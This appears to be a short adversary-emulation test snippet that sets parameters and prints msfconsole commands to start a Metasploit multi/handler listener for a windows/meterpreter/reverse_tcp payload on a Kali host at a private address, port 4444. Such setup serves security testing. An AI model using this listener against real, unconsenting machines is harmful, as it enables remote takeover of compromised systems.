<<parameters
Name	Description	Type	Default Value
hander	handler	String	exploit/multi/handler
payload	payload	String	windows/meterpreter/reverse_tcp
LHOST	LHOST	String	192.168.58.104
LPORT	LPORT	String	'4444'
parameters

cat << EOF
run the cmdlets below in kali(#{LHOST}):
msfconsole
msfconsole>use #{handler}
msfconsole>set PAYLOAD #{payload}
msfconsole>set LHOST #{LHOST}
msfconsole>set LPORT #{LPORT}
msfconsole>exploit
EOF
